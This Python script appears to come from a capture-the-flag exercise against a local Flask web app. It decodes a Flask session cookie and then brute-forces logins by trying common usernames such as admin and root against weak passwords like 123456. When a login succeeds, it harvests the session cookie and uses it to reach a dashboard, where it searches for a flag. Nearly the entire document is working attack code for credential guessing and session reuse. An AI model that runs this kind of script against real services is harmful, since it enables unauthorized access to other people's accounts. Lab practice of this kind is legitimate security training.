import requests
import re
import base64
import json
import hashlib
import hmac

BASE_URL = "http://127.0.0.1:32883"
DASHBOARD_URL = f"{BASE_URL}/dashboard"

print("[*] Attempting to forge Flask session cookies with different user_ids\n")

# Flask session format: base64(payload).timestamp.signature
# We need to find the secret key to forge valid signatures

# Known valid session
known_session = "eyJ1c2VyX2lkIjoxMDAzMn0.aVr0vQ.ApbUOJOZWLdmqD-z_ArqQn60Fzc"
parts = known_session.split('.')
known_payload = parts[0]
known_timestamp = parts[1]
known_signature = parts[2]

print(f"[+] Known session breakdown:")
print(f"  Payload: {known_payload}")
decoded = base64.urlsafe_b64decode(known_payload + '==').decode()
print(f"  Decoded payload: {decoded}")
print(f"  Timestamp: {known_timestamp}")
print(f"  Signature: {known_signature}\n")

print("="*60 + "\n")

# Since we can't forge the signature without the secret, let's try a different approach
# Maybe we can try to brute force user_ids by creating sessions through authentication
# with different usernames

print("[*] Strategy: Try to authenticate as different users to get their session cookies\n")

# Common usernames to try
test_usernames = [
    "admin", "administrator", "root", "user", "guest",  
    "test1", "test2", "user1", "user2", "customer1",
    "john", "jane", "bob", "alice", "charlie"
]

# Common passwords
test_passwords = ["test", "password", "admin", "123456", "password123"]

successful_auths = []

for username in test_usernames:
    for password in test_passwords:
        auth_data = {
            'username': username,
            'password': password
        }
        
        try:
            auth_resp = requests.post(f"{BASE_URL}/password/test", data=auth_data, allow_redirects=False, timeout=3)
            
            if auth_resp.status_code == 302 and '/dashboard' in auth_resp.headers.get('Location', ''):
                # Successful auth!
                print(f"[+] SUCCESS: {username}:{password}")
                
                # Extract session cookie
                set_cookie = auth_resp.headers.get('Set-Cookie', '')
                if 'session=' in set_cookie:
                    session_value = set_cookie.split('session=')[1].split(';')[0]
                    
                    # Decode session
                    session_parts = session_value.split('.')
                    payload = base64.urlsafe_b64decode(session_parts[0] + '==').decode()
                    session_data = json.loads(payload)
                    
                    print(f"  Session data: {session_data}")
                    
                    successful_auths.append({
                        'username': username,
                        'password': password,
                        'session': session_value,
                        'user_id': session_data.get('user_id')
                    })
                    
                    # Try to access dashboard with this session
                    cookies = {'session': session_value}
                    dash_resp = requests.get(DASHBOARD_URL, cookies=cookies, allow_redirects=False, timeout=3)
                    
                    print(f"  Dashboard status: {dash_resp.status_code}")
                    
                    if dash_resp.status_code == 200:
                        print(f"  [+] Dashboard accessed successfully!")
                        print(f"  Response length: {len(dash_resp.text)}B")
                        
                        # Check for FLAG
                        flag_match = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
                        if flag_match:
                            print(f"\n{'='*60}")
                            print(f"  [!] FLAG FOUND: {flag_match.group(0)}")
                            print(f"{'='*60}")
                            print(f"\n  Full response:\n{dash_resp.text}\n")
                            break
                        else:
                            print(f"  Dashboard snippet: {dash_resp.text[:400]}")
                    elif dash_resp.status_code != 500:
                        print(f"  Dashboard response: {dash_resp.text[:200]}")
        
        except:
            pass
    
    if successful_auths and any('FLAG' in str(a) for a in successful_auths):
        break

print(f"\n[SUMMARY]")
print(f"Successful authentications: {len(successful_auths)}")
if successful_auths:
    for auth in successful_auths:
        print(f"  {auth['username']}:{auth['password']} → user_id={auth['user_id']}")

